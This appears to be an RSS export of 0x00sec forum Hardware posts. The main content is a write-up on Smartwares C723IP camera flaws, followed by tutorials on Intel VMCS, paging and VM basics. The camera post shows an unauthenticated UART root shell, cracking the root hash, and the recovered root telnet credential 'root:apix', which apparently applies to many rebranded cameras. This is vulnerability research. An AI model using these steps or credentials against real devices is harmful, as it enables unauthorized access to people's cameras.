<p>For this writeup, I’m going to be using the Attify badge. All the steps will be the same no matter which device you are using. In addition, I’m running all of the tools on a Ubuntu based distribution.</p>
<p>Before taking the camera apart, I connected it to a test network and ran a nmap scan against it:</p>
<ul>
<li>23/tcp   open  telnet           security DVR telnetd (many brands)</li>
<li>80/tcp   open  http             mini_httpd 1.21 18oct2014</li>
<li>554/tcp  open  rtsp</li>
<li>8081/tcp open  blackice-icecap?</li>
</ul>
<p>Looking up that version of mini_httpd shows that there are two buffer overflow vulnerabilities:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-10442/product_id-18643/version_id-179675/Acme-Mini-Httpd-1.21.html" target="_blank" rel="noopener nofollow ugc">cvedetails.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-10442/product_id-18643/version_id-179675/Acme-Mini-Httpd-1.21.html" target="_blank" rel="noopener nofollow ugc">Acme Mini Httpd version 1.21 : Security vulnerabilities</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>Fantastic start. But I want to keep looking.</p>
<p>There is also a telnet service running, which isn’t a documented feature. We’ll keep this in mind for later.</p>
<p>Casing removed, the camera looks like this:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cb4b4959480cd4bf836315752aa5d56369768a6f.jpeg" alt="1" data-base62-sha1="t0qe53Qa8WtriES79zsKy6cmvO7" width="363" height="500"></p>
<p>To the left to the lens, right below the screw, there are a row of headers.<br>
I’m interested in the top three of them. Labelled RX,TX, and GND.<br>
TX = Transmitting<br>
RX = Receiving<br>
GND = Ground</p>
<p>The first step would normally be using a multimeter to determine which header is which, but thankfully the manufacturer of this camera labelled them for us. There’s also a hole, so soldering the jumper cables to the board isn’t really required here.</p>
<p>Make sure that the camera is unplugged from its power source before continuing.<br>
Connect the TX on the camera to the RX on your adapter of choice from the above list. Repeat this for the camera’s RX to the adapter’s TX. Finally connect GND to GND.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b28fc8950adc988a991de8e2422f8b3b89cfa0b7.jpeg" alt="2" data-base62-sha1="ptD2L8jGXcJAYyZI40XvPSu4E3t" width="375" height="500"></p>
<p>You can now connect the adapter to the computer.<br>
Confirm that the computer can see it by running “ls /dev/” and looking for “ttyUSB0”.<br>
If you have multiple ttyUSB’s, unplug the adapter and run the command again, taking note of which one is removed.</p>
<p>Download the baudrate.py script and make it executable with “chmod +x baudrate.py”.<br>
Running the script will automatically check for “/dev/ttyUSB0”. You can supply a different path with the -p argument if yours isn’t USB0.</p>
<p>With the script running, plug the camera into a power supply and within seconds you should be able to see output. If the text isn’t displaying properly, you can use the up and down arrows to change the baud rate.<br>
In the case of this camera, a baud rate of 115200 worked for me.</p>
<p>During the boot, I noticed two more issues.<br>
Both the WiFi’s PSK, and the user-set credentials for the web panel are being shown in plain text.</p>
<ul>
<li>
<p>get user0:admin:password123:0</p>
</li>
<li>
<p>user0:name:admin,passed:password123,leave:0</p>
</li>
<li>
<p>ssid=testnetwork</p>
</li>
<li>
<p>pass=supersecurepassword</p>
</li>
</ul>
<p>Let’s see what else we can find.</p>
<p>Once you have the baud rate you can close out of the script and execute screen, supplying the path and the baud rate. Make sure to run this as root as well.</p>
<p>sudo screen /dev/ttyUSB0 115200</p>
<p>And boom, unauthenticated root shell on the camera!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/221462933f8f90b3f4a386015e1bca91e5e2d437.png" alt="3" data-base62-sha1="4RtUlmxIylhTYCLg9T5iDMnLRUr" width="168" height="88"></p>
<p>If we check out /etc/passwd, we can see the root password stored as a salted MD5 hash.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/736a2551143190c822f3a6ab020755b658123fc7.png" alt="4" data-base62-sha1="gt0kaGMTCTkqnlBnWX5oMyCYjKn" width="690" height="44"></p>
<p>Let’s try to crack it using JohnTheRipper:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/01c464f7f62ddc52836d726bcc5fb253aeba695d.png" alt="5" data-base62-sha1="fDfx795wytayuSptepJDuQxzpb" width="690" height="151"></p>
<p>and it took an entire 32 seconds to brute force on my laptop…</p>
<p>Such a secure password.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/afbc4f1816fc9cba69b6ff96eb92b59a726a5e3d.png" alt="6" data-base62-sha1="p4D0svO7LKgp1Jv82syoMkfaALH" width="690" height="76"></p>
<p>We can now telnet into the device as root with the new found creds of root:apix:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/932dd758709a04579ca3d4c5de396906ec635476.png" alt="7" data-base62-sha1="l00oX3nDZ1UqshxrOThjtauuCuG" width="530" height="314"></p>
<p>When checking to see if these vulnerabilities were already disclosed, I found this post regarding a different vulnerability found in some WiFi cameras back in 2017:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://seclists.org/fulldisclosure/2017/Mar/23" target="_blank" rel="noopener nofollow ugc">seclists.org</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/3X/d/f/df4425b2b49bf796b97e1c496e86297681297680.png" class="thumbnail onebox-avatar" width="300" height="300">

<h3><a href="https://seclists.org/fulldisclosure/2017/Mar/23" target="_blank" rel="noopener nofollow ugc">Full Disclosure: Multiple vulnerabilities found in Wireless IP Camera (P2P)...</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
It seems that Smartwares is one of many companies purchasing re-branded generic IP cameras from a manufacturer in China.<br>
This post claims that over 1250 different camera models were vulnerable in 20, due to the same software running on all of them.<br>
Since I only have this one camera, I am not able to confirm it, but it seems likely that these found credentials would allow an attacker to telnet into a decent portion of cameras from this manufacturer.
<p>I also plan on taking a look at the web interface and the app, but that will be for later.</p>
<p>If you have any questions or feel that I missed any helpful details, feel free to let me know!</p>
            <p><small>16 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/smartwares-c723ip-camera-0-day-vulnerabilities/10376">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/smartwares-c723ip-camera-0-day-vulnerabilities/10376</link>
          <pubDate>Wed, 19 Dec 2018 01:38:43 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-10376</guid>
          <source url="https://0x00sec.org/t/smartwares-c723ip-camera-0-day-vulnerabilities/10376.rss">Smartwares C723IP Camera, 0-Day Vulnerabilities</source>
        </item>
        <item>
          <title>Csharp hackers and hardware hackers unite</title>
          <dc:creator><![CDATA[nugget]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hey all a image a combination arduino and reasberry pi with a full .NETstack;  sounds cool right?</p>
<p>I spotted this browsing the internet and thought I would spam it on IRC and here <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Seriously though, if the above (minus the spam part sounds interesting), check this out:</p>
<p><a href="https://www.kickstarter.com/projects/meadow/meadow-full-stack-net-standard-iot-platform?ref=section-design-tech-projectcollection-diy-projects" rel="nofollow noopener">https://www.kickstarter.com/projects/meadow/meadow-full-stack-net-standard-iot-platform?ref=section-design-tech-projectcollection-diy-projects</a></p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/csharp-hackers-and-hardware-hackers-unite/9732">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/csharp-hackers-and-hardware-hackers-unite/9732</link>
          <pubDate>Sat, 24 Nov 2018 06:50:29 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-9732</guid>
          <source url="https://0x00sec.org/t/csharp-hackers-and-hardware-hackers-unite/9732.rss">Csharp hackers and hardware hackers unite</source>
        </item>
        <item>
          <title>Robot vulnerabilities, contributing publicly, getting acknowledged and raising the awareness</title>
          <dc:creator><![CDATA[alias]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hello everyone,</p>
<p>Following with our work on robot security <a href="https://0x00sec.org/t/robot-hacking-the-robot-security-framework-rsf/7922">[1]</a>, <a href="https://0x00sec.org/t/robot-vulnerability-scoring-system-rvss/8661">[2]</a> or <a href="https://0x00sec.org/t/robotics-ctf-a-playground-for-robot-hacking/9015">[3]</a> and through conversations with manufacturers, we noticed the lack of concern robot manufacturers have for security. Over the last weeks we’ve heard repeatedly things like:</p>
<ul>
<li>
<strong>Manufacturer 1 (ROSCon 2018)</strong>: “We know our robots have a set of reported vulnerabilities” “we leave solving those up to the end user”</li>
<li>
<strong>Manufacturer 2  (ROSCon 2018)</strong>: “We do not care about security. Our robots do not have any security, we leave that up to the user”</li>
<li>
<strong>Manufacturer 3  (ROSCon 2018)</strong>: “We don’t need bounties. We don’t have flaws”</li>
</ul>
<p>Our conclusion is that there’s not enough awareness about the security topic in the robotics field likely, caused by the lack of official vulnerability reports for robot flaws. In an attempt to raise awareness we have created the <a href="https://github.com/aliasrobotics/RVDP" rel="nofollow noopener">Robot Vulnerability Disclosure Programs (RVDPs)</a>, an attempt to register and record robot vulnerabilities in a formal manner.</p>
<p>Programs are integrated into a single repository to facilitate management of reports. Vulnerabilities are community-contributed and participants get the chance to obtain public acknowledgement by submitting a vulnerability while providing prove of it.</p>
<p>Cheers,</p>
            <p><small>8 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/robot-vulnerabilities-contributing-publicly-getting-acknowledged-and-raising-the-awareness/9118">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/robot-vulnerabilities-contributing-publicly-getting-acknowledged-and-raising-the-awareness/9118</link>
          <pubDate>Tue, 23 Oct 2018 10:59:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-9118</guid>
          <source url="https://0x00sec.org/t/robot-vulnerabilities-contributing-publicly-getting-acknowledged-and-raising-the-awareness/9118.rss">Robot vulnerabilities, contributing publicly, getting acknowledged and raising the awareness</source>
        </item>
        <item>
          <title>A lot about Paging, a little about Virtualization - Part #2</title>
          <dc:creator><![CDATA[Rot127]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <h2>Part #2 - A lot about Paging, a little about Virtualization</h2>
<blockquote>
<p><strong>Disclaimer</strong></p>
<p>This article is based on extensive research and I am not an expert in this field. The only intention I’ve got was “ <em>to understand how virtualization is working and share it</em> ”. Please tell me any mistake you discover. I will correct it as quick as possible.</p>
</blockquote>
<p>So far we have talked about the processors part of virtualization. But what is with the memory? If a guest could do funny things in the memory it’s game over, isn’t it? Of cause it is, so in order to explain how the VMM keeps control over the memory, we’ll have to take a look how memory is organized.</p>
<p>Most explanations describe memory management linear. So, you have cells which can store bytes and those cells are indexed from 0x00000000-0xFFFFFFFF, those indexes are the (32 bit)-addresses used by the CPU.</p>
<pre> ______________
|              |&gt; [0x00000000]
|              |
|              |
    ........
|              |
|              |
|______________|&gt; [0xFFFFFFFF]

</pre>
<p>But this is no longer true for most computers (small embedded systems sometimes address memory like that to save resources).</p>
<p>Instead we have a memory management unit (MMU) which is sitting in your CPU and translates virtual addresses instead of physical ones (<em>virtual</em> doesn’t refers to virtualization. It’s just called this way).<br>
Paging is a pretty simple concept although it takes some time until you get the calculation part right and it feels somehow familiar.</p>
<p>The idea is that we take 4KB of physical memory and store the physical base address of this 4KB in a table entry.<br>
The 4KB are called a page. The table we store it in is called <strong>Page Table</strong> (PT).</p>
<p>Intel tells the programmers in its manual that a PT can hold 512 pages. 512 pages à 4KB are roughly 2MB of memory we could address.<br>
But we want to address more memory than 2MB, so we store the physical base address of 512 PTs into one <strong>Page Directory Entry</strong> (PDE). One PT à 2MB * 512 = 1GB per PDE.</p>
<p>1GB per PDE is still not enough. So we do it again, take 512 PDEs and store the physical base addresses of the those entries into a <em>Page Directory Pointer Table Entry</em> (PDPTE).<br>
And because we can, 512 PDPTEs into one <strong>Page Map Level 4 entry</strong> (PML4E).</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/20a283c0ddea5629a5ac7aaada246a417f29779c.png" alt="PageToTable" data-base62-sha1="4EHsPT0UPZhTL1WFYgPGX9TxBsU" width="675" height="500"></p>
<p>A physical address could be read like “give me the 0xffec1230-th byte in memory”. The virtual address instead contains all the indexes of the different pointer tables which leads the MMU to the correct byte:</p>
<p>Virtual 64bit address:</p>
<pre> FLAGS           |PML4     |PDPTE    |PDE      |PT       |Offset into page
 0000000000000000|000000000|000000000|000000000|000000000|000000000000
      [16bit]    |  [9bit] |  [9bit] |  [9bit] | [9bit]  |  [12bit]
      
(9bit encode 0-511)
</pre>
<p>Don’t freak out, here comes an example:</p>
<p>Let’s say we have this virtual address: 0x00000000007FC031. Written down in bits it looks like that:</p>
<pre>                            |PML4     |PDPTE    |PDE      |PT       |Offset into page
Binary:     0000000000000000|000000000|000000000|000000011|111111100|000000110001
Decimal:                         0         0         3        508        49
</pre>
<p>Based on the virtual address the MMU looks up the first entry in the PML4 (which has an index of 0).<br>
This one holds a physical address which is pointing to a PDPT.<br>
There again it shall follow the pointer in the first entry to a PD.<br>
In this PD it selects the fourth PT.<br>
In the PT it looks up the pointer at the 509th entry.<br>
Finally, this last pointer points the MMU to a page. In this page the 50th byte is read or written.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cf8d27d246aa28fe65619d66c801e7067297c75c.png" alt="VA_to_PA" data-base62-sha1="tC5gamaHo5HkF8C0gYz8mjhEOaU" width="690" height="491"></p>
<p>Keep in mind that the actual physical address of each table <em>entry</em> consists of two parts. The <em>leading</em> bits of the physical address stored in an table entry, plus the <em>index</em> from the virtual address. Those parts get appended to create a valid physical address.</p>
<p>Maybe you already knew that, but the address BUS in 64bit computers is <em>most the time</em> just 48bit wide. So in reality processors only use 48bit to address memory, not 64. This means that the pointers to the next table entry or bit aren’t 64bit long.</p>
<p>But because each table <em>entry</em> is 64bit long, the pointer to the next entry doesn’t use all bits.</p>
<p>In fact the a table entry stores the first 36bit of the final pointer. If the index is 9bits, it gets attached together with 3 extra bits. Those 3 extra bits are padding. If the appended index identifies a byte, those 3 bits won’t be used.</p>
<pre>  pointer from table entry                    index     padding
 |      [36bits]                            | [9bits]  |
 | 0000000000000000000000000000000000000000 | 00000000 | 000
</pre>
<pre>  pointer from table entry                    index of byte
 |      [36bits]                            | [12bits]
 | 0000000000000000000000000000000000000000 | 00000000000
</pre>
<hr>
<p>Paging is a tradeoff: The MMU has to translate virtual addresses into physical ones. This means the processor needs more time to access memory. But on the other hand, we can also do way more interesting things.<br>
Because the pointer to the next entry isn’t occupying the whole 64 bits (but 36bits), we can use the rest of them to store flags.<br>
As an example for all the other entries we take a look at a Page Table Entry:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7340ceb7d80701d29630306196c3a3ab7558582f.png" alt="PTEntry" data-base62-sha1="grzL1JeuTBCpFo5j1rZuGcWfAXJ" width="690" height="50"></p>
<p>Every page and its prior table entry gets a privilege level assigned (red). The privilege level can be 0 which makes this page and therefore its stored data, code or table entries only accessible by the kernel or the OS. Only accessible by the OS/kernel means, that the processor must execute OS/kernel code while requesting the data from the memory. Otherwise the MMU will through a Page Fault Exception.<br>
If it is set to 1 it is accessible by user applications.</p>
<p>Read/write flags (blue) are self-explanatory.</p>
<p>And last but obviously not least, there is the execute-disable bit (green), which will prevent any execution of the page content. This is a security feature to prevent malware to execute code, which is written in a data segment of a process. But don’t worry, <a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634">there are ways around that</a>.</p>
<hr>
<p>So why have we gone through all this? Well, first of all it’s basic computer science knowledge :P. And secondly, Intel supports hardware wise memory virtualization based on this concept.</p>
<p>Just to make it clear: The MMU only translates the given virtual address into a physical one and delivers the data back to the processor. Setting up all the page tables and assign them to running processes is still done by the kernel.</p>
<p>So if you boot up a virtualized guest on your computer it will set up the page tables naturally. Although, the host already had set up its own paging structures. To prevent a complete jumble in your memory, the guests access to the memory needs to be manipulated as well.</p>
<p>In the past, this had to be done via the VMM which held a shadow (aka a copy) of the guest paging tables and translated the guest pages into the physical ones, which is incredible slow. So Intel added an Extended Page Tables (EPT) functionality into its processors, which does the translation process in the MMU and with it much quicker.</p>
<p>If the processor is in a VM-non root state and the guest requests memory, the MMU will first calculate the guest physical address as normal.<br>
At this point the MMU looks up a special pointer called the <em>Extended Page Table Pointer</em>.<br>
This pointer is simply 36bits long. In the next step the MMU appends bit 47:39 of the <em>guests physical address</em> to it plus 3 bits.</p>
<pre> |      [36bits]                            | [9bits]  |
 | 0000000000000000000000000000000000000000 | 00000000 | 000
</pre>
<p>Looks familiar? It is indeed the same translate procedure as usual. Although, this time the MMU isn’t using a virtual address to read the indexes from, but the guest physical address.</p>
<p>And this was basically it. The guests memory gets mapped into the hosts memory without overwriting whings. The host has every opportunity to manipulate the guests memory, while the guest is not even aware it is using a different paging structure.</p>
<hr>
<p>If paging was completely new for you, this was probably a hard read. I tried to make it accessible and haven’t covered things like <a href="https://en.wikipedia.org/wiki/Translation_lookaside_buffer" rel="noopener nofollow ugc">caching</a> or memory segmentation with the <a href="https://en.wikipedia.org/wiki/Global_Descriptor_Table" rel="noopener nofollow ugc">GDT</a>.<br>
Please let me know, if there are any unclear statements or mistakes.</p>
<p>In the next part I initially planned to write about VT-d, but I am pretty sick of starring at Intel manuals. So when I have some spare time I will introduce Qubes OS, which uses virtualization heavily. Or do a write up about an exploit which breaks out of a guest. Or even write a PoC <a href="https://en.wikipedia.org/wiki/Blue_Pill_(software)" rel="noopener nofollow ugc">Bluepill</a> like rootkit.</p>
<hr>
<div align="center"><a href="https://0x00sec.org/t/the-vmcs-part-1/8739">&lt;--- Part #1 - The VMCS</a></div>
<hr>
*Do it yourself*
<ul>
<li>
<a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-1/" rel="noopener nofollow ugc">https://rayanfam.com/topics/hypervisor-from-scratch-part-1/ </a> (building a kernel module)</li>
<li>
<a href="https://software.intel.com/sites/default/files/managed/7c/f1/326019-sdm-vol-3c.pdf" rel="noopener nofollow ugc">https://software.intel.com/sites/default/files/managed/7c/f1/326019-sdm-vol-3c.pdf</a> (raw information)</li>
</ul>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-lot-about-paging-a-little-about-virtualization-part-2/8868">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-lot-about-paging-a-little-about-virtualization-part-2/8868</link>
          <pubDate>Thu, 04 Oct 2018 19:18:48 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8868</guid>
          <source url="https://0x00sec.org/t/a-lot-about-paging-a-little-about-virtualization-part-2/8868.rss">A lot about Paging, a little about Virtualization - Part #2</source>
        </item>
        <item>
          <title>The VMCS - Part #1</title>
          <dc:creator><![CDATA[Rot127]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <h3>The VMCS - Part #1</h3>

Edit <a href="https://0x00sec.org/t/the-vmcs-part-1/8739/1">(click for more details)</a>
<blockquote>
<p><strong>Disclaimer</strong></p>
<p>This article is based on extensive research and I am not an expert in this field. The only intention I’ve got was “ <em>to understand how virtualization is working and share it</em> ” (a pretty naive target). Please tell me any mistake you discover. I will correct it as quick as possible.</p>
</blockquote>
<p>So in the last part we talked about the life cycle of a VM.</p>
<p>But how does the processor gets the information for setting up the guest, what registers it should load and which interrupts or CPU-instructions cause a VM-Exit?</p>
<p>For all this information the VMM needs the Virtual Machine Control Structure (VMCS) which holds all the information about the configuration and which rules it has to obey. So, how does this structure looks like?</p>
<pre>    VMCS
     __________________________________
    |                                  |
    | ID [30:0] Shadow indicator [31]  | 
    |__________________________________|[byte 4]
    |                                  |
    | abort indicator (boring)         | 
    |__________________________________|[byte 8]
    |                                  |
    | Guest-state Area                 |
    |__________________________________|
    |                                  |
    | Host-State Area                  |
    |__________________________________|
    |                                  |
    | VM execution control fields      |
    |__________________________________|
    |                                  |
    | VM-Exit control fields           |
    |__________________________________|
    |                                  |
    | VM-Entry control fields          |
    |__________________________________|
    |                                  |
    | VM-Exit information fields       |
    |__________________________________|[byte 4096]

</pre>
<p>The first fields are pretty self-explanatory. The first 31 bits (30:0) are the ID of the VMCS. Every guest gets its own VMCS. So it is possible to have different guests with different rule sets.<br>
Although it seems reasonable that this ID is simply a memory address, it is actually not. In fact the processor returns the ID when you reading a model specific register (MSR).</p>
<pre><code class="lang-apache">xor eax, eax
mov rcx, 0x480    ; copy id for MSR which holds information about VMCS
readmsr           ; stores VMCS identifier into eax 
</code></pre>

MSRs <a href="https://0x00sec.org/t/the-vmcs-part-1/8739/1">(click for more details)</a>
<p>Bit 31 marks whether it is a self updating copy of an already existing VMCS (isn’t important for us now) and bits 63:32 are always zero, except an error occurred during a VM-Exit.</p>
<p>The rest of the VMCS is the actual important stuff. Here are the rules for all the magic written down.</p>
<hr>
<p><strong>The guest-state area</strong></p>
<blockquote>
<p>Remember that the processor had to save all the register values and some other information of a guest when it exits? Well, these values get in this area. For example:</p>
<ul>
<li>SP, IP, RF</li>
<li>control registers (CR0 – CR4)</li>
<li>segment registers with base addresses and stuff (CS, SS, DS etc.).</li>
<li>
<a href="https://wiki.osdev.org/Global_Descriptor_Table" rel="nofollow noopener">GDT</a> register and <a href="https://wiki.osdev.org/Interrupts_Descriptor_Table" rel="nofollow noopener">IDT</a> register base addresses</li>
<li>values of some MSRs</li>
<li>processor state (e.g.: active, halt…)</li>
<li>
<a href="https://en.wikipedia.org/wiki/Paging" rel="nofollow noopener">PDPTEs</a> (don’t worry, we’ll come to that in the third part)</li>
<li>and a little more</li>
</ul>
</blockquote>
<p><strong>The host state area</strong></p>
<blockquote>
<p>is the equivalent to the guest-state area. It safes more or less the same registers as the guest-state area, but on a VM-Entry.</p>
</blockquote>
<p><strong>VM-execution control fields</strong></p>
<blockquote>
<p>Here you define what a guest is allowed to process and what causes a VM-Exit:</p>
<ul>
<li><em>Interrupts</em></li>
</ul>

Over simplified explanation of interrupts <a href="https://0x00sec.org/t/the-vmcs-part-1/8739/1">(click for more details)</a>
<ul>
<li>
<em>Processor based controls</em><br>
Setting those bits you can flag some instructions so they lead to a VM-Exit. For example: Read or write to control register 03 and 08, use I/O instructions, read/write the local descriptor table or exit at any instruction.</li>
</ul>
<p>Note: Not every processor supports all the settings listed in the Intel manuals. Hypervisors like Xen need to read MSRs before it turns some of those settings on.</p>
<ul>
<li>Additionally, you can define whether the VMM wants to use bitmaps. Bitmaps? What are bitmaps? Bitmaps are like arrays of bits and each bit represents an interrupt, a MSR or an I/O instruction (depends whether you’ve got a I/O, a MSR or Interrupt bitmap).<br>
If for example an interrupt occurs while the guest is running on the CPU, the processor looks up the equivalent bit in the bitmap. If it is 1 -&gt; VM-Exit. Is it 0? No VM-Exit. Same procedure if the guest wants to use a MSR or I/O instructions.</li>
</ul>
</blockquote>
<p>Of cause there are way more settings but we want to keep it simple (and I’m not smart enough to understand them all <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"> ).</p>
<p><strong>VM-Exit controls</strong></p>
<blockquote>
<p>This field mainly defines which registers are loaded or stored during a VM-Exit (mostly MSRs and debug registers).</p>
</blockquote>
<p><strong>VM-Entry controls</strong></p>
<blockquote>
<p>As above the VM-Entry controls list which registers are loaded or stored on VM-Entry.<br>
But on top of that the VMM can specify interrupts which shall be injected into the guests’ execution flow.</p>
<p>To inject an interrupt in the guests’ execution flow, the VMM just have to specify the entry in the interrupt descriptor table. The processor will then prepare the necessary registers (depends on the interrupt) and executes the interrupt-handler once it returned into non-root mode.</p>
</blockquote>
<p><strong>VM-Exit information field</strong></p>
<blockquote>
<p>How does the VMM knows the reason for the VM-Exit? Because the processor sets the relevant bits in this field. The VMM can read them afterwards and knows, which instruction the guest tried to execute.</p>
</blockquote>
<hr>
<p>Where the VMCS is stored in the memory is totally up to the processor (researchers have found a way to find it anyway in memory).<br>
So in order to read and write bits in the VMCS you have to call the functions VMREAD/VMWRITE.</p>
<pre><code class="lang-apache">mov rax, 0x6800   ; 0x6800 encodes the guest-state field which holds the value of CR0
mov rbx, 0x1337   ; set value which is written
vmwrite rax, rbx  ; writes value to VMCS
</code></pre>
<p>At this point just think about those settings again.<br>
Before the code of a guest can run on the processor, the VMM gets a chance to manipulate the whole environment of the guest.<br>
Registers, interrupts, IO related things and the memory (we’ll come to this in the next part). So the VMM holds all the basic <em>hardware</em> strings in its hands. Hypervisors like Xen, KVM or Hyper-V are built on top of that and can provide you with a way more abstract and easier way to spawn VMs and manage them.</p>
<p>This was the second part. Please let me know if you have any questions or want more details.</p>
<p>In case you want to program a basic hypervisor yourself, you can follow the first of those links down there.</p>
<hr>
<div align="center"> <a href="https://0x00sec.org/t/basics-and-lifecycle-of-a-vm-part-0/8723"> &lt;-- Part #0 - Basics and lifecycle of a VM</a>
</div>
<div align="center">
<a href="https://0x00sec.org"> A lot about Paging, a little about virtualization - Part #2 --&gt;</a> </div>
<hr>
<p><em>Do it yourself</em></p>
<ul>
<li>
<a href="https://rayanfam.com/topics/hypervisor-from-scratch-part-1/" rel="nofollow noopener">https://rayanfam.com/topics/hypervisor-from-scratch-part-1/</a> (building a kernel module)</li>
<li>
<a href="https://software.intel.com/sites/default/files/managed/7c/f1/326019-sdm-vol-3c.pdf" rel="nofollow noopener">https://software.intel.com/sites/default/files/managed/7c/f1/326019-sdm-vol-3c.pdf</a> (raw information)</li>
<li>
<a href="https://www.codeproject.com/Articles/215458/Virtualization-for-System-Programmers" rel="nofollow noopener">https://www.codeproject.com/Articles/215458/Virtualization-for-System-Programmers</a> (same content like this, but different words and with PoC)</li>
</ul>
<p><em>But I want to read about hacky stuff!1!</em></p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Blue_Pill_(software)" rel="nofollow noopener">https://en.wikipedia.org/wiki/Blue_Pill_(software)</a></li>
<li><a href="https://web.archive.org/web/20110913070538/http://www.invisiblethingslab.com/resources/bh08/" rel="nofollow noopener">https://web.archive.org/web/20110913070538/http://www.invisiblethingslab.com/resources/bh08/</a></li>
<li><a href="https://web.archive.org/web/20080418123748/http://www.bluepillproject.org/" rel="nofollow noopener">https://web.archive.org/web/20080418123748/http://www.bluepillproject.org/</a></li>
</ul>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/the-vmcs-part-1/8739">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/the-vmcs-part-1/8739</link>
          <pubDate>Thu, 27 Sep 2018 18:14:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8739</guid>
          <source url="https://0x00sec.org/t/the-vmcs-part-1/8739.rss">The VMCS - Part #1</source>
        </item>
        <item>
          <title>Basics and lifecycle of a VM - Part #0</title>
          <dc:creator><![CDATA[Rot127]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <h2>Basics and lifecycle of a VM - Part #0</h2>

Edit <a href="https://0x00sec.org/t/basics-and-lifecycle-of-a-vm-part-0/8723/1">(click for more details)</a>
<blockquote>
<p><strong>Disclaimer</strong></p>
<p>This article is based on extensive research and I am not an expert in this field. The only intention I’ve got was “<em>to understand how virtualization is working and share it</em>” (a pretty naive target). Please tell me any mistake you discover. I will correct it as quick as possible.</p>
</blockquote>
<p>How does a Virtual Machine works? Well, an OS is running in a separate program (e.g. Virtual-Box, Hyper-V) which makes this OS “think” it runs on a real PC, but in reality it has no power over my PC at all. This all can be done because magicians working at Intel, AMD and this company which develops VirtualBox.</p>
<p>This is the standard explanation which is kinda right, but… nah, how does this stuff works in reality? So, lets get the basic high level view:</p>
<p>When you booting up a guest OS as VM on your machine, a part of your kernel starts executing special virtualization instructions on your CPU. This kernel module is called a Hypervisor or a Virtual Machine Monitor (VMM) which, you guessed it, monitors what your VM does.</p>
<p>There are two ways to design a VMM.</p>
<ol>
<li>The host virtualization type. Here your install a software on an already existing OS (the host). This software installs it’s hypervisor driver and runs the VMs with it.<br>
<em>Software examples:</em> <a href="https://en.wikipedia.org/wiki/VirtualBox" rel="nofollow noopener">VirtualBox</a>, <a href="https://en.wikipedia.org/wiki/VMware" rel="nofollow noopener">Vmware</a>.</li>
</ol>
<blockquote>
<pre> –––––––––––––––––––––––     –––––––––––––––––––––––
|                       |   |                       |
|       GUEST OS        |   |      GUEST OS         |
|                       |   |                       |
 –––––––––––––––––––––––     –––––––––––––––––––––––
|                       |   |                       |
|     KERNEL GUEST OS   |   |   KERNEL GUEST OS     |           ...
 –––––––––––––––––––––––     –––––––––––––––––––––––   –––––––––––––––––––––
            |___________________________|________________________|
                                 |
 ––––––––––––––––––––––––––––––––|––––––––––––––––––––––––––  
|                                |                          |
|         HOST OS                |        HOST OS           |
 –––––––––––––––––––––––––––––––––––––––––––––––––––––––––––
